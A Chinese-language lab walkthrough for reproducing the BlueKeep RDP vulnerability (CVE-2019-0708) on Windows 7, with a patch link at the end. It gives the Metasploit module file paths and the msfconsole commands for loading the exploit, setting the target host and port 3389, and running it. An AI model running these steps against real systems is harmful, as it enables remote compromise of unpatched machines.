---
title: CVE-2019-0708漏洞复现
date: 2019-09-07 10:30:29
toc: true
tags:
- CVE-2019-0708
categories:
- 漏洞复现
---

## CVE-2019-0708漏洞复现

[![asciicast](https://asciinema.org/a/266469.svg)](https://asciinema.org/a/266469)

### 环境准备

- [Windows7 sp1 下载链接](https://msdn.itellyou.cn/)
- [exploit地址](https://github.com/rapid7/metasploit-framework/pull/12283/files?file-filters%5B%5D=.rb)

### 配置exp

攻击套件放到msf对应位置，如存在，请覆盖。如下对应地址

```shell
rdp.rb -> /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb

rdp_scanner.rb -> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb

cve_2019_0708_bluekeep.rb -> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb

cve_2019_0708_bluekeep_rce.rb -> /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
```

### 运行

```
进入程序：msfconsole
重载：reload_all
启用0708攻击模块：use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
查看配置：info
```

![image](https://user-images.githubusercontent.com/38073810/64468945-035b7580-d15d-11e9-9b1a-ea7f3175bb23.png)

![image](https://user-images.githubusercontent.com/38073810/64468951-1e2dea00-d15d-11e9-9fe9-3a6a1821f506.png)

```
设置RHOSTS、RPOTRT、target
target有0-4，设置成自己对应的

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 10.211.55.3
RHOSTS => 10.211.55.3
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RPORT 3389
RPORT => 3389
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 1
target => 1
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
```

![image](https://user-images.githubusercontent.com/38073810/64468982-9c8a8c00-d15d-11e9-85f2-80dbea2ea779.png)

![image](https://user-images.githubusercontent.com/38073810/64469059-892bf080-d15e-11e9-95f2-4eaeb38a007a.png)

### 漏洞修复补丁

[Download](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)

